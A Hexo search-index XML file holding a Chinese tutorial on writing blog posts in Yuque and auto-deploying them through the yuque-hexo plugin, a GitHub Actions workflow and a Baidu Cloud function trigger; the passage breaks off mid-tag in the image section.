<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hexo x 语雀  云端写作 自动部署</title>
      <link href="/posts/mhhzac/"/>
      <url>/posts/mhhzac/</url>
      
        <content type="html"><![CDATA[<div class="hide-toggle" style="border: 1px solid #fdf1e7"><div class="hide-button toggle-title" style="background-color: #fdf1e7;"><i class="fas fa-caret-right fa-fw"></i><span>点击查看参考教程 </span></div>    <div class="hide-content"><table><thead><tr><th><strong>参考方向</strong></th><th><strong>教程原贴</strong></th></tr></thead><tbody><tr><td>原教程</td><td><a href="">hexo × 语雀 实现云端富文本写作</a></td></tr></tbody></table></div></div><h1>前言</h1><div class="hide-toggle" style="border: 1px solid  #feefee"><div class="hide-button toggle-title" style="background-color:  #feefee;"><i class="fas fa-caret-right fa-fw"></i><span>想法起源</span></div>    <div class="hide-content"><p>我看富文本编辑器十分方便而且快速，但是 hexo 没有，使用过 <a href="https://cheng.cjic.xyz/posts/xg6rkw/">web 版 vscode</a> ，感觉还行虽然没写作富文本编辑器便捷，但是部署简单且容易实现，如果时间倒退，我绝不再搞语雀。还有就是别忘了备份，不然不想搞了连改都麻烦。<br>为了获得最纯粹的写作体验，优雅得实现博客的撰写，同时又完全摆脱进行终端上的操作，完全实现云端写作，我查阅大量教程，最终选择了 Hexo x Github action x 语雀 x 百度云。<br>不知道怎么了，看大佬的教程中  vercel 构建的 api ，我试了一下好像不能用<br>And 因为比较菜的原因，一开始没有成功实现 GitHub action 自动部署，我又选择尝试了 triavs-ci 更加麻烦，建议不要尝试。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1647935667039-2b9eed68-e9df-417c-9c5c-98307e97bd27.png#clientId=u304660c7-1f68-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=206&amp;id=u931c74ed&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=258&amp;originWidth=256&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=90412&amp;status=done&amp;style=none&amp;taskId=u6293480a-98c8-4088-b420-b18effa12a8&amp;title=&amp;width=204.8#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=dC2eW&amp;originHeight=258&amp;originWidth=256&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="图片.png"></p></div></div><div class="note info flat"><div class="hide-block"><button type="button" class="hide-button" style="">效果展示    </button><div class="hide-content"><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1647934780489-b063439e-1e32-46a9-b584-2b6f70c5e59f.png#clientId=u304660c7-1f68-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=635&amp;id=ub12c1ccd&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=794&amp;originWidth=1593&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=29653&amp;status=done&amp;style=none&amp;taskId=u89a3bc09-2794-41b9-8fe8-565d91722ff&amp;title=&amp;width=1274.4#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=vcpql&amp;originHeight=794&amp;originWidth=1593&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="图片.png"></p></div></div></div><p><a href="https://www.yuque.com/">语雀</a>，是蚂蚁集团旗下的在线文档编辑与协同工具。 语雀使用了“结构化知识库管理”，形式上类似书籍的目录。 与其他产品可以随意建立文档不同，语雀上的每一篇文档必须属于某一个知识库，语雀希望通过这样的产品设计，来从源头上帮助用户建立起知识管理的意识，培养良好的知识管理习惯。</p><h1>准备</h1><ul><li>语雀账号<a href="https://www.yuque.com/login?platform=wechat&amp;inviteToken=f6e959505e77f114312173f53ec62f7b2c4ff248e08ed045603ad16d2ecf62ec">申请</a></li><li>serverless ：百度云<a href="https://console.bce.baidu.com/cfc/#/cfc/functions">授权</a>（ <a href="https://console.bce.baidu.com/cfc/#/cfc/functions">https://console.bce.baidu.com/cfc/#/cfc/functions</a>）， <a href="https://cloud.baidu.com/doc/CFC/s/pjwvz3zg8">开通方法指南</a></li><li>获取 github 私钥，前往 <a href="https://github.com/settings/tokens">github 的 token 设置</a>（ <a href="https://github.com/settings/tokens">https://github.com/settings/tokens</a>），点击生成密钥按钮，填写密钥名称，勾选 repo 选项。</li></ul><div class="note warning modern"><p>token 只出现一次 请妥善保管</p></div><h1>使用语雀</h1><h2 id="创建语雀仓库">创建语雀仓库</h2><p>登陆<a href="https://www.yuque.com/">语雀</a>，新建知识库。将知识库的可见范围改为 “互联网可见”。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1647936788547-ab84d8a7-5c93-4afb-86c7-e70b08e76fda.png#clientId=u304660c7-1f68-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=713&amp;id=uda9deda1&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=891&amp;originWidth=1896&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=144709&amp;status=done&amp;style=none&amp;taskId=u7b19d2aa-8944-43f3-b704-b9d0c69e31f&amp;title=&amp;width=1516.8#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=M58Cy&amp;originHeight=891&amp;originWidth=1896&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="图片.png"><div class="note warning modern"><p>新用户，七天以后才可更改互联网可见</p></div></p><h2 id="导入文章">导入文章</h2><p>点击知识库，选择新建下的导入， 选择 Markdown ，将博客中_posts 下 文章进行批量导入。<img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1647936953300-04e5b9b2-7412-4c5b-bbc2-00667c097be7.png#clientId=u304660c7-1f68-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=710&amp;id=u1088a4bd&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=887&amp;originWidth=1497&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=202152&amp;status=done&amp;style=none&amp;taskId=ub3c6140d-3105-4044-982f-b03f616aac3&amp;title=&amp;width=1197.6#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=gVkY7&amp;originHeight=887&amp;originWidth=1497&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="图片.png"><div class="note warning modern"><p>可能识别文章会出现一些问题，比如分割线没了，头部模板变标题等等，导入完记得改改</p></div></p><h2 id="模板的创建">模板的创建</h2><p>为了方便以后文档的撰写，可以新建模板。注意图片链接需要加上 引号 防止被渲染成链接。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1647937257384-8bf64394-d93c-455b-be54-938ee606d0a5.png#clientId=u304660c7-1f68-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=690&amp;id=u80271480&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=862&amp;originWidth=1438&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=29908&amp;status=done&amp;style=none&amp;taskId=ua5355ef3-7ba6-4ab6-be73-d10af3ae239&amp;title=&amp;width=1150.4#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=a1QNB&amp;originHeight=862&amp;originWidth=1438&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="图片.png"></p><h1>Hexo + Butterfly</h1><h2 id="语雀插件的安装">语雀插件的安装</h2><p>首先在根目录打开终端安装 yuque-hexo。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i -g yuque-hexo</span><br></pre></td></tr></table></figure><h2 id="修改-package-json">修改 package.json</h2><p>在第一个对象代码块后增加”yuqueConfig” 代码块。其中需要修改”login”、”repo”、”token” 字段。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hexo-site&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;private&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hexo generate&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;clean&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hexo clean&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;deploy&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hexo deploy&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;server&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hexo server&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;yuqueConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;postPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;source/_posts&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;cachePath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;yuque.json&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;mdNameFormat&quot;</span><span class="punctuation">:</span> <span class="string">&quot;slug&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;adapter&quot;</span><span class="punctuation">:</span> <span class="string">&quot;markdown&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;concurrency&quot;</span><span class="punctuation">:</span> <span class="number">5</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;baseUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://www.yuque.com/api/v2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;login&quot;</span><span class="punctuation">:</span> <span class="string">&quot;u26310061&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;repo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nlr8hz&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;token&quot;</span><span class="punctuation">:</span> <span class="string">&quot;***********************&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;onlyPublished&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;onlyPublic&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><ol><li>点击进入博客的知识库，在浏览器地址栏中将用户名和仓库名复制分别粘贴为”login”、”repo” 的字段。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.yuque.com/u26310061/nlr8hz</span><br><span class="line">u26310061 为用户名</span><br><span class="line">nlr8hz 为仓库名</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1647937614912-5e7082d4-995a-45cc-b125-5ba75fa8a4fd.png#clientId=u304660c7-1f68-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=430&amp;id=u6e695e0c&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=538&amp;originWidth=1364&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=148989&amp;status=done&amp;style=none&amp;taskId=u91412cf9-955f-43ad-a5ee-eeb2776233f&amp;title=&amp;width=1091.2#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=lfAmc&amp;originHeight=538&amp;originWidth=1364&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="图片.png"></p><ol start="2"><li>token 是在右上角头像 -&gt; 账户设置 -&gt; Token 添加的，权限的话只给读取就可以。复制粘贴获取的”token” 字段。</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1647937989760-e7b9c7bc-995c-45ce-a456-5dcc6d8a9dc3.png#clientId=u304660c7-1f68-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=495&amp;id=u5f7b35fb&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=619&amp;originWidth=1307&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=26803&amp;status=done&amp;style=none&amp;taskId=u9f7dfce2-2bc1-4d40-b66f-1bc81d62939&amp;title=&amp;width=1045.6#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=FaVVe&amp;originHeight=619&amp;originWidth=1307&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="图片.png"></p><ol start="3"><li>修改  “scripts” 增加”sync”: “yuque-hexo sync” 和  “clean:yuque”: “yuque-hexo clean”。</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hexo-site&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;private&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hexo generate&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;clean&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hexo clean&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;deploy&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hexo deploy&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;server&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hexo server&quot;</span><span class="punctuation">,</span></span><br><span class="line">+       <span class="attr">&quot;sync&quot;</span><span class="punctuation">:</span> <span class="string">&quot;yuque-hexo sync&quot;</span><span class="punctuation">,</span></span><br><span class="line">+       <span class="attr">&quot;clean:yuque&quot;</span><span class="punctuation">:</span> <span class="string">&quot;yuque-hexo clean&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h1>github action 自动部署</h1><h2 id="修改-hexo-主题文件中的-meta">修改 hexo 主题文件中的 meta</h2><p>以 butterfly 主题为例，<br>打开主题文件的 <code>[Blogroot]/themes/butterfly/layout/includes/head.pug</code>。<br>该步骤是确保语雀中的图片可以正常加载。</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  meta(name=&quot;theme-color&quot; content=themeColor)</span><br><span class="line"><span class="addition">+ meta(name=&quot;referrer&quot; content=&quot;no-referrer&quot;)</span></span><br></pre></td></tr></table></figure><h2 id="配置-deploy-项">配置 deploy 项</h2><p>打开站点配置文件 <code>[Blogroot]/_config.yml</code>, 找到 deploy 配置项，使用之前生成的 Token 和各个站点仓库 URL 来组装地址。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repository:</span></span><br><span class="line">    <span class="attr">github:</span> <span class="string">https://用户名:token@github.com/用户名/仓库名.git</span></span><br><span class="line">    <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure><h2 id="配置-Github-Action">配置 Github Action</h2><p>在 <code>[Blogroot]</code> 新建.github 文件夹，注意开头是有个. 的。然后在.github 内新建 workflows 文件夹，再在 workflows 文件夹内新建 autodeploy.yml, 在 <code>[Blogroot]/.github/workflows/autodeploy.yml</code> 里面输入</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">自动部署</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当有改动推送和语雀发布时，启动Action</span></span><br><span class="line"><span class="attr">on:</span> [<span class="string">push</span>, <span class="string">repository_dispatch</span>]</span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">deploy:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">检查分支</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">ref:</span> <span class="string">master</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">#2020年10月后github新建仓库默认分支改为main，注意更改</span></span><br><span class="line">      <span class="comment">#但私有仓库貌似还是master并没有变</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">安装</span> <span class="string">Node</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/setup-node@v1</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="string">&quot;12.x&quot;</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">安装</span> <span class="string">Hexo</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          export TZ=&#x27;Asia/Shanghai&#x27;</span></span><br><span class="line"><span class="string">          npm install hexo-cli -g</span></span><br><span class="line"><span class="string">          #npm install gulp-cli -g</span></span><br><span class="line"><span class="string">          #如果你有使用gulp的话，打开上面这一行</span></span><br><span class="line"><span class="string">          npm install yuque-hexo -g</span></span><br><span class="line"><span class="string">          yuque-hexo clean</span></span><br><span class="line"><span class="string">          yuque-hexo sync</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">更新</span> <span class="string">语雀拉取缓存及文章</span> <span class="comment">#更新yuque 拉取的文章到GitHub仓库</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          echo `date +&quot;%Y-%m-%d %H:%M:%S&quot;` begin &gt; time.log</span></span><br><span class="line"><span class="string">          git config --global user.name &quot;[GithubUsername]&quot; #修改</span></span><br><span class="line"><span class="string">          git config --global user.email &quot;[GithubEmail]&quot; #修改</span></span><br><span class="line"><span class="string">          git add .</span></span><br><span class="line"><span class="string">          git commit -m &quot;Refresh yuque json&quot; -a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">推送</span> <span class="string">语雀拉取缓存及文章</span> <span class="comment">#推送修改后的yuque json</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">ad-m/github-push-action@master</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">github_token:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GITHUB_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">缓存</span> <span class="string">Hexo</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/cache@v1</span></span><br><span class="line">        <span class="attr">id:</span> <span class="string">cache</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">path:</span> <span class="string">node_modules</span></span><br><span class="line">          <span class="attr">key:</span> <span class="string">$&#123;&#123;runner.OS&#125;&#125;-$&#123;&#123;hashFiles(&#x27;**/package-lock.json&#x27;)&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">安装依赖</span></span><br><span class="line">        <span class="attr">if:</span> <span class="string">steps.cache.outputs.cache-hit</span> <span class="type">!=</span> <span class="string">&#x27;true&#x27;</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          npm install --save</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">生成静态文件</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          hexo clean</span></span><br><span class="line"><span class="string">          hexo g</span></span><br><span class="line"><span class="string">          #gulp</span></span><br><span class="line"><span class="string">          #如果你有使用gulp的话，打开上面这一行</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">部署</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          git config --global user.name &quot;[GithubUsername]&quot; #修改</span></span><br><span class="line"><span class="string">          git config --global user.email &quot;[GithubEmail]&quot; #修改</span></span><br><span class="line"><span class="string">          git clone https://github.com/[GithubUsername]/[存放源码的github私有仓库].git .deploy_git #修改</span></span><br><span class="line"><span class="string">          hexo deploy</span></span><br></pre></td></tr></table></figure><div class="tabs" id="test"><ul class="nav-tabs"></ul><div class="tab-contents"></div></div><h2 id="查看部署情况">查看部署情况</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1647941478646-57397258-3d3c-462e-8d24-67e54ba14423.png#clientId=u369d245c-eb95-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=drop&amp;id=ucfaa6898&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%97%A0%E6%A0%87%E9%A2%98.png&amp;originHeight=890&amp;originWidth=1853&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=66738&amp;status=done&amp;style=none&amp;taskId=ubac209e4-7924-4fc0-91bd-99e7ec6d00c&amp;title=#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=Re2oL&amp;originHeight=890&amp;originWidth=1853&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="无标题.png"></p><h1>配置云函数</h1><ol><li>登陆<a href="https://login.bce.baidu.com/?redirect=https%3A%2F%2Fconsole.bce.baidu.com%2Fcfc%2F#/cfc/functions">百度云</a>后，点击创建函数，选择空白函数后，超时设置 10s，运行时选择 python2.7。点击下一步。</li><li>选择 HTTP 触发器，URL 路径填’/'，HTTP 方法填写 POST 和 GET，然后点击提交。</li><li>点击函数，选择函数列表，将以下代码粘贴并保存，将用户名，仓库地址改为自己的信息。将保存的私钥进行替换 ，token 字段需要保留。测试代码，当返回”This’s OK!”   且 github action 开始运行则说明成功。</li><li>点击触发器，复制 URL 路径作为触发链接，在语雀中进行配置。</li></ol><div class="hide-toggle" style="border: 1px solid  #ebf9ed"><div class="hide-button toggle-title" style="background-color:  #ebf9ed;"><i class="fas fa-caret-right fa-fw"></i><span>操作图片</span></div>    <div class="hide-content"><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1647941467011-07b406af-dec3-4593-8b62-d820b4f47908.png#clientId=u369d245c-eb95-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=drop&amp;id=uefe58543&amp;margin=%5Bobject%20Object%5D&amp;name=1%E6%97%A0%E6%A0%87%E9%A2%98.png&amp;originHeight=641&amp;originWidth=1911&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=73965&amp;status=done&amp;style=none&amp;taskId=u92d17859-b90f-4375-b764-ceafc027137&amp;title=#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=JJlHs&amp;originHeight=641&amp;originWidth=1911&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="1无标题.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1647941583518-2b0e97b1-fc91-4cbd-a393-f68dd4a3fad4.png#clientId=u369d245c-eb95-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=296&amp;id=ud298421e&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=370&amp;originWidth=1323&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=13045&amp;status=done&amp;style=none&amp;taskId=ub3fa280d-bc25-43ea-9267-55e87823728&amp;title=&amp;width=1058.4#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=svtVe&amp;originHeight=370&amp;originWidth=1323&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="图片.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1647941597606-10ae6207-2cd6-48be-b207-425e6a91258d.png#clientId=u369d245c-eb95-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=665&amp;id=uf803a70c&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=831&amp;originWidth=1256&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=27905&amp;status=done&amp;style=none&amp;taskId=uf6a7acda-ddfd-4da9-b03e-81131f45d59&amp;title=&amp;width=1004.8#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=aAr6r&amp;originHeight=831&amp;originWidth=1256&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="图片.png"><img 